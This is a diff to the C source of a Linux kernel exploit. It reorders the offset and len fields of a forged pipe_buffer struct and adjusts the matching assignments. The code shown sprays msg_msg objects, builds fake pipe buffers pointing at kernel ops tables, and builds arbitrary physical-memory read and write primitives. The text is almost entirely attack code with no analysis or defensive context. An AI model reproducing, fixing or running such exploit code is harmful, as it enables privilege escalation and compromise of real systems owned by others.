@@ -146,8 +146,8 @@ void restore_pipe_buffer_state(void) {}
 
 struct pipe_buffer {
     size_t page;
-    unsigned int len;
     unsigned int offset;
+    unsigned int len;
     size_t ops;
     unsigned int flags;
     size_t private;
@@ -175,8 +175,8 @@ void stage2(void)
     struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
     memset(corr_pipe_buffer, 0, sizeof(struct pipe_buffer));
     corr_pipe_buffer->page = vmemmap_pipe_buffer;
-    corr_pipe_buffer->offset = 8;
-    corr_pipe_buffer->len = __MSG_SIZE;
+    corr_pipe_buffer->offset = __MSG_SIZE;
+    corr_pipe_buffer->len = 8;
     corr_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     corr_pipe_buffer->flags = 0x10;
     for (size_t i = 0; i < MSG_SPRAYS2; ++i)
@@ -224,7 +224,7 @@ void stage3(void)
     for (size_t i = 0; i < MSG_SPRAYS2; ++i) {
         get_msg(qids2[i], buffer, MSG_SIZE2, 0, MSG_COPY|IPC_NOWAIT);
         struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
-        if (corr_pipe_buffer->offset != 8 || corr_pipe_buffer->len != __MSG_SIZE) {
+        if (corr_pipe_buffer->offset != __MSG_SIZE || corr_pipe_buffer->len != 8) {
             printf("[+] found overlayed msg_msg %zd\n", i);
             overlayed_id = i;
         }
@@ -256,14 +256,14 @@ void stage4(void)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);
 
-    cor_pipe_buffer->len = 8+__MSG_SIZE;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8+__MSG_SIZE;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = vmemmap_base;
-    next_cor_pipe_buffer->len = 0;
-    next_cor_pipe_buffer->offset = PAGE_SIZE;
+    next_cor_pipe_buffer->offset = 0;
+    next_cor_pipe_buffer->len = PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
@@ -301,14 +301,14 @@ void arbr_phys(size_t paddr, size_t *addr)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);
 
-    cor_pipe_buffer->len = 8+__MSG_SIZE;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8+__MSG_SIZE;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
-    next_cor_pipe_buffer->len = paddr % PAGE_SIZE;
-    next_cor_pipe_buffer->offset = PAGE_SIZE;
+    next_cor_pipe_buffer->offset = paddr % PAGE_SIZE;
+    next_cor_pipe_buffer->len = PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
@@ -322,14 +322,14 @@ void arbw_phys(size_t paddr, size_t value)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);
 
-    cor_pipe_buffer->len = 8+__MSG_SIZE;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8+__MSG_SIZE;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
-    next_cor_pipe_buffer->len = 0;
-    next_cor_pipe_buffer->offset = paddr % PAGE_SIZE;
+    next_cor_pipe_buffer->offset = 0;
+    next_cor_pipe_buffer->len = paddr % PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
